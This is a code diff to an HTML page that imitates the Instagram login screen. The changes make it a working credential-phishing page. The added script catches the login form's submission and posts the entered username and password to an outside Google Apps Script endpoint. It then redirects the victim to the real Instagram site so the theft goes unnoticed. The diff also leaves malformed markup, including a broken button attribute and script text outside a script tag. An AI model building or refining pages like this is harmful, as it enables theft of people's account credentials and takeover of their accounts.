@@ -152,16 +152,7 @@
   <form id="login-form">
     <input type="text" name="username" placeholder="Username, email address or mobile ..." required>
     <input type="password" name="password" placeholder="Password" required>
-    <a href="https://www.instagram.com/" style="
-  display: inline-block;
-  padding: 10px 20px;
-  background-color: #0095f6;
-  color: white;
-  text-decoration: none;
-  border-radius: 10px;
-  font-weight: bold;
-  text-align:center
-">Log in</a>
+    <button type:"submit">Log in</button>
   </form>
 
   <div class="forgot">Forgotten password?</div>
@@ -172,23 +163,25 @@
   </div>
 
   <script>
-    const form = document.getElementById('login-form');
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      const data = new FormData(form);
-      fetch("https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec", {
-        method: "POST",
-        body: data
-      })
-      .then(response => alert("Submitted!"))
-      .catch(error => alert("Error occurred"));
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', function(e) {
+    e.preventDefault(); // Prevent default form submission
+
+    const data = new FormData(form);
+
+    fetch("https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec", {
+      method: "POST",
+      body: data
+    })
+    .then(response => {
+      // ✅ Success — redirect after submission
+      window.location.href = "https://www.instagram.com/"; // Replace with your target link
+    })
+    .catch(error => {
+      alert("Error occurred");
     });
-  </script>
-  <!-- Dark Footer Strip -->
-<div class="footer-strip">
-  <p>By continuing, you agree to Instagram’s <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
-</div>
-<script>
+  });
+</script>
   window.addEventListener('load', function () {
     document.getElementById('preloader').style.display = 'none';
     document.getElementById('main-content').style.display = 'block';
